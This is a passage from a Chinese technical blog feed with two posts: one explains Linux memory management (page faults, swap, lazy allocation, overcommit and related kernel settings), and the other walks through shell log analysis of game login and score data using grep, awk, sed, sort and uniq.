    <content type="html"><![CDATA[<p>Linux下的内存管理其实都绕不开文章题目的4个词语：缺页、swap、惰性分配和overcommit，而操作系统的内存管理的难点在于：</p><ol><li>物理内存不够该怎么做？</li><li>内存分配怎么才能做到高效？</li></ol><p>本文想谈的是，内存不足时Linux操作系统是怎么高效分配内存资源的。</p><p>Linux 内核给每个进程都提供了一个独立的虚拟地址空间，并且这个地址空间是连续的。这样，进程就可以很方便地访问内存，更确切地说是访问虚拟内存。</p><p>32位操作系统的可寻址范围是4G，因此32位系统的最大可分配的内存空间为4G。比如我们一个32位系统，内存为1G，我们可以给某个进程最大可分配3G内存空间（1G为系统自留使用）。对于64位系统，寻址空间为2的64次方，一个非常大的数，理论上我们不可能使用完这些空间。而64位系统的内核空间和用户空间都是 128T，分别占据整个内存空间的最高和最低处，剩下的中间部分是未定义的。</p><p><img src="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/1.png" alt="image"></p><p>进程是分为内核态和用户态，进程处于用户态时，只能访问用户空间地址，当陷入内核态时，就可以方便地进行系统调用，使用内核空间地址。用户空间内存，从低到高分别是五种不同的内存段。</p><ol><li>只读段，包括代码和常量等。</li><li>数据段，包括全局变量等。</li><li>堆，包括动态分配的内存，从低地址开始向上增长。</li><li>文件映射段，包括动态库、共享内存等，从高地址开始向下增长。</li><li>栈，包括局部变量和函数调用的上下文等。栈的大小是固定的，一般是 8 MB。</li></ol><p><img src="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/4.png" alt="image"></p><p>在这五个内存段中，堆和文件映射段的内存是动态分配的。比如说，使用 C 标准库的 malloc() 或者 mmap() ，就可以分别在堆和文件映射段动态分配内存。</p><p>因为每个进程都可以寻址的空间范围是虚拟内存的地址大小，如果我们所有进程的虚拟内存加起来，肯定是远比物理内存要大的。操作能做到能向进程提供比物理内存大的虚拟内存，依赖三项技术：</p><ol><li>快速的内存地址转换（虚拟地址到物理地址）</li><li>惰性分配</li><li>overcommit</li></ol><p>虚拟内存地址映射到物理内存地址，是一项极为高频的操作，CPU并不会直接参与这项转换的工作，而是将地址转换的工作交给了MMU。每个进程都有自己的<strong>页表</strong>，记录虚拟地址与物理地址的映射关系，大小一般为4KB。页表实际上存储在 CPU 的内存管理单元MMU中，这样，正常情况下，处理器就可以直接通过硬件，找出要访问的内存。</p><p><img src="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/2.png" alt="image"></p><p>为了加速完成内存映射，操作系统会将TLB（Translation Lookaside Buffer，转译后备缓冲器）作为MMU 中页表的高速缓存，进而提高 CPU 的内存访问性能。当CPU给MMU传新虚拟地址之后，MMU先去问TLB那边有没有，如果有就直接拿到物理地址发到总线给内存，没有则再进行MMU的地址转换操作。</p><p><img src="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/5.png" alt="image"></p><p>地址翻译的过程：</p><p><img src="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/10.png" alt="image"></p><p>考虑一个问题：虚拟地址在TLB和Page Table都没有找到对应的物理页帧时会发生什么？会发生<strong>缺页异常Page Fault</strong>，它是一个由硬件中断触发的可以由软件逻辑纠正的错误。假如目标内存页在物理内存中没有对应的页帧或者存在但无对应权限，CPU 就无法获取数据，这种情况下CPU就会报告一个缺页错误。一般的缺页错误有以下三种：</p><p><img src="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/6.png" alt="image"></p><p>当进程向系统申请分配内存时，操作系统采取的是<strong>惰性分配</strong>的策略，即系统会快速回应需要内存的进程表示你的申请是有效的，但此时并不会为该进程真正分配出内存空间，而是在该进程真正使用到这段内存时才真正分配，这就是惰性分配思想。操作系统采取惰性分配的好处个人认为如下：</p><p><strong>避免某些进程空占着内存资源。有些进程在初始化时就先分配了大量内存，但这些内存空间也许要等到某些条件触发时才会利用上，也有可能到进程退出时也用不到这些内存，因此为了保证内存的使用率，惰性分配很有必要。以一个“延时满足”的思想解决了内存消耗过快的问题。</strong></p><p>我们知道，物理内存不足我们可以通过swap分区来扩展可利用的内存资源，也就是虚拟内存。</p><p>虚拟内存在逻辑上是很大，但是实际上我们不会无节制地开启虚拟内存，一般而言，我们线上的服务器都是采取物理内存+swap分区的策略，比如8G的物理内存+8G swap分区的策略，比较高效的处理内存不足的问题。swap的思想是把不常用的内存数据放在磁盘中去，Swap 其实就是把一块磁盘空间当成内存来用。它可以把进程暂时不用的数据存储到磁盘中（这个过程称为换出，swapout），当进程访问这些内存时，再从磁盘读取这些数据到内存中（这个过程称为换入，swapin），那怎么判定内存的哪些数据是不常用数据需要换出呢，LRU,LFU等都是常用的算法。当物理内存紧张的情况下，当进程访自己已申请的内存地址时，操作系统发现这段内存地址并不在物理内存里，此时就会发生<strong>缺页中断</strong>，根据内存置换算法选出指定页swapout到磁盘，再将马上要使用到的页swapin到内存，完成了页面的swapin和swapout。</p><p>那当我们不得不开启swap时，swap分区的大小该怎么设计呢？一般而言，内存和swap分区的大小1：1是个不会太错的选择，比如4G的物理内存可以考虑配备4G的swap分区。如果物理内存远小于swap分区大小会有什么后果？这样的配备首先说明物理内存已经远不能处理进程的数据了，需要通过大量借助磁盘来扩展内存才能满足进程需求。这本来就是一个不合理的配比，这会导致内存数据块频繁地被置换到磁盘，产生大量的磁盘IO，导致系统很卡（系统性能都全消耗在缺页中断产生的磁盘IO），上面跑的进程很难得到有效调度。</p><p>但反过来，物理内存远大于swap分区并无副作用，比如我们线上 的服务器，物理内存256G，平时活动高峰期内存也完全足够，但为了稳妥起见，我们也还是配了16G的swap分区，作为系统内存异常时的一个最后保障。一些线上服务为了保持高性能一般都会把swap关掉，比如redis。</p><p>这是我们线上服务器的物理内存和交换分区的配比情况，128G物理内存 + 4G的交换分区，因为游戏服务器非常重视单机高性能，所以基本都是内存能开多大就开多大，swap的开启也只是为了某些极端情况下的保底处理，正常情况下都用不上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mem: 14G Active, 21G Inact, 43G Wired, 1239M Buf, 47G Free</span><br><span class="line"></span><br><span class="line">Swap: 4096M Total, 4096M Free</span><br></pre></td></tr></table></figure><p>我们回到讨论内存分配机制。惰性分配会引入一个新问题：开空头支票带来的副作用，当进程真正要使用早期申请的这块内存时，系统发现系统的总的可利用的内存（物理内存+swap）已经用完了，没法兑现早期的承诺了，这就是操作系统的overcommit。这里继续举个例子来说明：</p><p>系统总可利用的内存资源总大小时4G，一个进程在初始化时向系统申请1G资源，系统因为惰性分配的原因，只回复了该进程已为你分配了1G资源，但实际上幷没有开始分配。一段时间后，该进程需要访问这段已申请的内存地址，系统开始马上回顾当前剩余的空间，发现可用的内存空间已不足200M，此时就是overcommit，翻译过来就是“过度承诺”，操作系统这种操作之后，需要一些措施来收拾残局。</p><p>针对overcommit的场景，首先想到的是，为什么不可以在进程向系统申请分配空间时，系统先去查一下已分配出多少内存空间了，然后再决定是否回复进程本次申请是否成功？答案是可以的，Linux对应的是系统的一个配置，直接禁用overcommit就好。但是禁用的坏处是，内存的利用率不高。考虑到进程之间很少会同时访问大量内存空间，比如4G的内存，操作系统进行overcommit了12G的的空头支票给进程，因为并不是所有进程都在同一刻要求使用4G以上的内存资源，所以overcommit在大多数场合是合适的，不开启overcommit，可利用的资源是4G，开启后可能就可以达到8G甚至更多。但最后还是得有措施保底，即真的有某一个时刻进程要使用的内存空间大于可利用的内存空间呢？</p><p>上面的swap是为了解决<strong>物理内存</strong>不足，但当物理内存+交换分区都不足时，比如上面的配置，我们可以利用的虚拟内存总和就是16G，当已分配的内存超过这个数字时，操作系统必须采取某个策略来处理内存不足的问题了。事实上，内存再大，对应用程序来说，也有不够用的时候。</p><p>这个策略就是OOM killer，即当系统中可利用的内存资源已经耗尽时，OOM killer机制会对杀死分数最高的进程，以求释放内存资源保证系统可以稳定运行。</p><p>在Linux上swap，overcommit都是有参数可以调整的，比如调overcommit对应的参数是overcommit_memory。</p><p>overcommit_memory是一个内核对内存分配的一种策略,它有三个可选值:0、1、2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;torvalds&#x2F;linux&#x2F;blob&#x2F;master&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;mman.h</span><br><span class="line"> </span><br><span class="line">#define OVERCOMMIT_GUESS                0</span><br><span class="line">#define OVERCOMMIT_ALWAYS               1</span><br><span class="line">#define OVERCOMMIT_NEVER                2</span><br></pre></td></tr></table></figure><ul><li>0：内核将检查是否有足够的内存分配给程序。如果没有则申请失败，并把错误返回给应用进程。而在Redis中这个错误就会表现为“Cannot allocate memory”，然后触发OOM</li><li>1：表示内核允许超量使用内存直到用完为止</li><li>2：表示内核决不超量使用内存，即系统整个内存空间不能超过swap+50%的RAM值，50%是overcommit_ratio默认值，此参数支持修改</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lijunshi@GIH-D-21171:&#x2F;mnt&#x2F;e&#x2F;services$ grep -i commit &#x2F;proc&#x2F;meminfo</span><br><span class="line">CommitLimit:      515524 kB</span><br><span class="line">Committed_AS:    3450064 kB</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中， CommitLimit = swap（交换内存） + mem(物理内存) * overcommit_ratio / 100。这和CommitLimit的数值是吻合的。</p><p>overcommit_ratio查看方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;overcommit_ratio</span><br><span class="line">50</span><br></pre></td></tr></table></figure><p>所以我们可以根据需求配置这个参数，刚举的例子就是对应为参数1，允许内核分配超过所有物理内存和交换空间总和的内存，当实在是无法处理时就使用OOM killer杀进程释放内存。在实际案例中，Redis建议把这个值设置为1，是为了让bgsave时fork能够在低内存下也执行成功。</p><p>这是我个人PC上的ubuntu的内存配置，16G物理内存搭配了48G的swap分区，物理内存已消耗了50%，但此状态下的swap很低，基本没有使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lijunshi@GIH-D-21171:&#x2F;mnt&#x2F;e&#x2F;services$ free  -h</span><br><span class="line">              total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:           15Gi       7.3Gi       8.4Gi        17Mi       223Mi       8.5Gi</span><br><span class="line">Swap:          48Gi       124Mi        47Gi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lijunshi@GIH-D-21171:&#x2F;mnt&#x2F;e&#x2F;services$ cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;overcommit_memory</span><br><span class="line">0</span><br><span class="line">lijunshi@GIH-D-21171:&#x2F;mnt&#x2F;e&#x2F;services$ cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness</span><br><span class="line">60</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我的ubuntu系统overcommit_memory默认为0，即表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。也就是每次内存申请时都将判定这次申请是否真的成功，放弃惰性分配策略，不会产生overcommit现象。</p><p>而swap分区对应的内存参数是swappiness。swappiness的值的大小对如何使用swap分区是有着很大的联系的。swappiness=0的时候表示最大限度使用物理内存，然后才是swap空间，swappiness＝100的时候表示积极的使用swap分区，并且把内存上的数据及时的搬运到swap空间里面。linux的基本默认设置为60。当swappines设置得比较大时，你会发现即使系统物理内存还剩余很多，但系统还是倾向于大量使用很慢的swap分区，这就导致系统很卡。但值得注意的是swappiness=0并不表示禁用交换分区，而是指尽可能不使用交换分区，但当内存已经耗尽时也会选择使用交换分区，如果不想使用交换分区，那就不要启用swap。</p><p>所以一个重要的性能优化经验就是：<strong>最好禁用swap</strong>。swap应该是针对以前内存小的一种优化,如果是高性能服务，最好禁止 Swap，比如redis，mysql等服务，都是推荐禁用swap的。如果必须开启 Swap，那需要降低 swappiness 的值，减少内存回收时 Swap 的使用倾向。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>性能优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell日志数据分析实战</title>
    <link href="/2020/12/06/shell%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    <url>/2020/12/06/shell%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p>shell 脚本在日志扫档中用的比较多，脚本使用的熟练程度能极大地影响你的工作效率，比如某一天我的领导叫我帮忙扫一下日志，把一些关键的数据扫出来，当时因为自己对shell不是很熟练再加上日志格式比较复杂，自己花了一个下午才把数据给整出来，当时也特别烦躁，因为明知这是一个很简单的任务，但因为自己对工具（脚本）的不熟练，导致这个领导看起来无关痛痒的小需求（确实也是很简单）却占用了自己很多的工作时间，把我原先的工作给耽误了，搞到我当天加班到很晚才把当天的工作完成，当时就认识到服务器开发中shell脚本的熟练掌握非常重要。</p><p>日常数据收集和分析中shell脚本用的最多的指令就是这几个：<strong>grep, awk, sed, sort, uniq, xargs,wc,head,tail</strong>。个人认为这9个指令可以解决我们平时90%的数据分析任务，实在有些复杂的功能，那就需要写一写shell脚本，所以还得熟悉一下shell语法的for,if else,读写文件就足够了。 以下以2个实际的数据归档的案例，串联起上面提到的所有shell 指令，把他们的重要的使用场景和方法实践。</p><h2 id="任务1：2020年11月25日8点以来login次数前20的玩家"><a href="#任务1：2020年11月25日8点以来login次数前20的玩家" class="headerlink" title="任务1：2020年11月25日8点以来login次数前20的玩家"></a>任务1：2020年11月25日8点以来login次数前20的玩家</h2><p>日志格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[2020-12-05 19:21:37][6772100] logout</span><br><span class="line">[2020-12-05 19:22:18][6797297] login</span><br><span class="line">[2020-12-05 19:22:50][6770758] login</span><br><span class="line">[2020-12-05 19:24:46][6796204] relogin</span><br><span class="line">[2020-12-05 19:24:48][6770256] login</span><br><span class="line">[2020-12-05 19:25:34][6796204] relogin</span><br></pre></td></tr></table></figure><p>实现思路：</p><ol><li>筛选登录: grep</li><li>筛选时间：awk 的 if</li><li>排序前20：sort</li></ol><p>实现步骤：</p><ol><li>我比较喜欢用Sed先整理格式，即把分割符统一替换成空格： <code>sed -e &#39;s/\[/ /g&#39; -e &#39;s/\]/ /g&#39; login.dat</code></li></ol><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2020-12-05 19:39:47  6771096  login</span><br><span class="line">2020-12-05 19:42:33  6769079  logout</span><br><span class="line">2020-12-05 19:42:33  6769162  logout</span><br><span class="line">2020-12-05 19:43:13  6798402  relogin</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>筛选登录用grep： <code> sed -e &#39;s/\[/ /g&#39; -e &#39;s/\]/ /g&#39; login.dat  |grep -w login</code></li></ol><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2020-12-05 19:14:53  6772163  login</span><br><span class="line">2020-12-05 19:18:24  6796958  login</span><br><span class="line">2020-12-05 19:18:27  6798402  login</span><br><span class="line">2020-12-05 19:39:47  6771096  login</span><br><span class="line">2020-12-05 19:46:19  6769423  login</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>筛选时间用awk: <code>sed -e &#39;s/\[/ /g&#39; -e &#39;s/\]/ /g&#39; login.dat  |grep -w login | awk &#39;&#123;if($1&quot; &quot;$2&gt; &quot;2020-11-25 08:00:00&quot;) print $3&#125;&#39;</code></li></ol><p>注意，$变量之间用””就可以把他们转化为字符串连接在一起，如果要转整形需使用”+”</p><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">6768524</span><br><span class="line">6797124</span><br><span class="line">6797435</span><br><span class="line">6795472</span><br><span class="line">6768435</span><br><span class="line">6769433</span><br><span class="line">6797123</span><br><span class="line">6770253</span><br><span class="line">6772163</span><br><span class="line">6796958</span><br><span class="line">6798402</span><br><span class="line">6797297</span><br><span class="line">6770758</span><br><span class="line">6770256</span><br><span class="line">6798284</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>排序+计数用sort+uniq: <code> sed -e &#39;s/\[/ /g&#39; -e &#39;s/\]/ /g&#39; login.dat  |grep -w login | awk &#39;&#123;if($1&quot; &quot;$2&gt; &quot;2020-11-25 08:00:00&quot;) print $3&#125;&#39;  | sort | uniq -c |sort</code></li></ol><p>注意sort后再接uniq 统计重复行才能统计出来，最后再接sort排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">11 6796765</span><br><span class="line">11 6797821</span><br><span class="line">12 6769451</span><br><span class="line">12 6769464</span><br><span class="line">12 6796365</span><br><span class="line">12 6796761</span><br><span class="line">12 6796762</span><br><span class="line">13 6798238</span><br><span class="line">14 6796763</span><br><span class="line">15 6766560</span><br><span class="line">22 6798433</span><br><span class="line">23 6768911</span><br><span class="line">37 6806225</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>取前20用tail：<code>sed -e &#39;s/\[/ /g&#39; -e &#39;s/\]/ /g&#39; login.dat  |grep -w login | awk &#39;&#123;if($1&quot; &quot;$2&gt; &quot;2020-11-25 08:00:00&quot;) print $3&#125;&#39;  | sort | uniq -c |sort |tail -n 20 |awk &#39;&#123;print $2&#125;&#39;</code>得到最后结果</li></ol><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">6798615</span><br><span class="line">6767256</span><br><span class="line">6769367</span><br><span class="line">6769684</span><br><span class="line">6796775</span><br><span class="line">6797820</span><br><span class="line">6769387</span><br><span class="line">6796765</span><br><span class="line">6797821</span><br><span class="line">6769451</span><br><span class="line">6769464</span><br><span class="line">6796365</span><br><span class="line">6796761</span><br><span class="line">6796762</span><br><span class="line">6798238</span><br><span class="line">6796763</span><br><span class="line">6766560</span><br><span class="line">6798433</span><br><span class="line">6768911</span><br><span class="line">6806225</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="任务2：输出2020年11月25日8点以来login次数前20的玩家具体的参与活动的具体情况，格式按usernum-总分数输出"><a href="#任务2：输出2020年11月25日8点以来login次数前20的玩家具体的参与活动的具体情况，格式按usernum-总分数输出" class="headerlink" title="任务2：输出2020年11月25日8点以来login次数前20的玩家具体的参与活动的具体情况，格式按usernum 总分数输出"></a>任务2：输出2020年11月25日8点以来login次数前20的玩家具体的参与活动的具体情况，格式按usernum 总分数输出</h2><p>这里涉及到两个文件的数据合并，文件1就是上一个任务的最终结果，文件2的格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[2020-12-05 18:55:25] [party]desc&#x3D;finish_game,uid&#x3D;6772009,game&#x3D;1,score&#x3D;1168, count&#x3D;64</span><br><span class="line">[2020-12-05 18:56:02] [party]desc&#x3D;finish_game,uid&#x3D;6772009,game&#x3D;1,score&#x3D;1680, count&#x3D;128</span><br><span class="line">[2020-12-05 18:56:40] [party]desc&#x3D;finish_game,uid&#x3D;6772009,game&#x3D;2,score&#x3D;120, count&#x3D;12</span><br><span class="line">[2020-12-05 18:57:34] [party]desc&#x3D;finish_game,uid&#x3D;6772009,game&#x3D;2,score&#x3D;240, count&#x3D;24</span><br><span class="line">[2020-12-05 18:58:53] [party]desc&#x3D;finish_game,uid&#x3D;6772009,game&#x3D;3,score&#x3D;120, count&#x3D;12</span><br><span class="line">[2020-12-05 21:38:23] [party]desc&#x3D;finish_game,uid&#x3D;6795956,game&#x3D;5,score&#x3D;780, count&#x3D;50</span><br><span class="line">[2020-12-05 21:38:54] [party]desc&#x3D;finish_game,uid&#x3D;6795956,game&#x3D;4,score&#x3D;60, count&#x3D;60</span><br><span class="line">[2020-12-05 21:40:27] [party]desc&#x3D;finish_game,uid&#x3D;6795956,game&#x3D;2,score&#x3D;300, count&#x3D;30</span><br><span class="line">[2020-12-05 21:42:10] [party]desc&#x3D;finish_game,uid&#x3D;6766739,game&#x3D;5,score&#x3D;830, count&#x3D;68</span><br><span class="line">[2020-12-05 21:43:11] [party]desc&#x3D;finish_game,uid&#x3D;6766739,game&#x3D;1,score&#x3D;1888, count&#x3D;128</span><br><span class="line">[2020-12-05 21:43:54] [party]desc&#x3D;finish_game,uid&#x3D;6766739,game&#x3D;2,score&#x3D;170, count&#x3D;17</span><br><span class="line">[2020-12-05 21:45:27] [party]desc&#x3D;finish_game,uid&#x3D;6766739,game&#x3D;3,score&#x3D;150, count&#x3D;15</span><br><span class="line">[2020-12-05 21:46:20] [party]desc&#x3D;finish_game,uid&#x3D;6766739,game&#x3D;2,score&#x3D;120, count&#x3D;12</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>思路：</p><ol><li>grep出关键信息，做好格式化</li><li>累计计算玩家的所有的分数</li><li>找出文件1的uid在文件2中的分数</li></ol><p>实现步骤：</p><ol><li>grep出关键信息，通过awk做好格式化：<br><code>grep finish_game znq20.dat  | awk -F &#39;,&#39; &#39;&#123;print $2,$4&#125;&#39;</code></li></ol><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;6772005 score&#x3D;40</span><br><span class="line">uid&#x3D;6772005 score&#x3D;120</span><br><span class="line">uid&#x3D;6772005 score&#x3D;110</span><br><span class="line">uid&#x3D;6772005 score&#x3D;500</span><br><span class="line">uid&#x3D;6772007 score&#x3D;1608</span><br><span class="line">uid&#x3D;6772007 score&#x3D;230</span><br><span class="line">uid&#x3D;6772007 score&#x3D;110</span><br><span class="line">uid&#x3D;6772007 score&#x3D;550</span><br><span class="line">uid&#x3D;6772007 score&#x3D;280</span><br><span class="line">uid&#x3D;6772008 score&#x3D;1560</span><br><span class="line">uid&#x3D;6772008 score&#x3D;240</span><br><span class="line">uid&#x3D;6772008 score&#x3D;210</span><br><span class="line">uid&#x3D;6772008 score&#x3D;140</span><br><span class="line">uid&#x3D;6772008 score&#x3D;430</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>继续使用awk继续分割，继续格式化，输出【uid 分数】的格式：<br><code>grep finish_game znq20.dat  | awk -F &#39;,&#39; &#39;&#123;print $2,$4&#125;&#39; | awk -F &#39;[= ]&#39;  &#39;&#123;print $2,$4&#125;&#39;</code></li></ol><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">6772008 140</span><br><span class="line">6772008 430</span><br><span class="line">6772009 1168</span><br><span class="line">6772009 1680</span><br><span class="line">6772009 120</span><br><span class="line">6772009 240</span><br><span class="line">6772009 120</span><br><span class="line">6795956 780</span><br><span class="line">6795956 60</span><br><span class="line">6795956 300</span><br><span class="line">6766739 830</span><br><span class="line">6766739 1888</span><br><span class="line">6766739 170</span><br></pre></td></tr></table></figure><ol start="3"><li>统计每个用户的游戏总分数，使用awk中的字典实现，用END流程控制，最后输出结果：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep finish_game znq20.dat  | awk -F &#39;,&#39; &#39;&#123;print $2,$4&#125;&#39; | awk -F &#39;[&#x3D; ]&#39;  &#39;&#123;print $2,$4&#125;&#39; |  awk &#39;&#123;map[$1]+&#x3D;$2&#125; END&#123;for(k in map) print k,map[k]&#125;&#39;</span><br></pre></td></tr></table></figure>输出：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">6797415 310</span><br><span class="line">6795471 3108</span><br><span class="line">6798595 1735</span><br><span class="line">6797867 50856</span><br><span class="line">6767900 5269</span><br><span class="line">6767695 200</span><br><span class="line">6772097 6246</span><br><span class="line">6797801 570</span><br><span class="line">6768636 1897</span><br><span class="line">6769367 121206</span><br><span class="line">6795865 2580</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>上一步的结果已经输出到文件，现在cat practice*.txt就会输出AB文件的内容，因为A文件每行只有一列，B文件每行2列,因此用awk 的NF区分这是A文件的数据还是B文件数据。再判断A文件的UID是否在B文件，有则输出B文件对应的行：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat practice*.txt | awk &#39;&#123;if(NF&#x3D;&#x3D;1) map1[$1]&#x3D;1; else map2[$1]&#x3D;$2&#125;  END&#123;for(k in map1) if(map2[k]&gt;0) print k,map2[k]&#125;&#39;</span><br></pre></td></tr></table></figure>输出：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">6769451 1135</span><br><span class="line">6798433 1230</span><br><span class="line">6769367 121206</span><br><span class="line">6806225 9901</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>日志数据过滤分析中重度依赖awk和grep,而sed,wc,sort,uniq等也有比较多的使用场景，因此着重掌握awk和grep尤为重要。这是这些指令的使用场景：</p><ul><li>awk：格式化输出，按列分割，按列打印，使用if,for,begin,end做流程控制，用关联内置的关联数组做数据的记录和计算，还有一些常用的内置额字符串相关的函数需要记牢：match(s,r)，index(s,t)，length(s) ，substr(s,p,n)</li><li>grep：用于数据过滤，掌握一些参数即可，比如-v，-w, 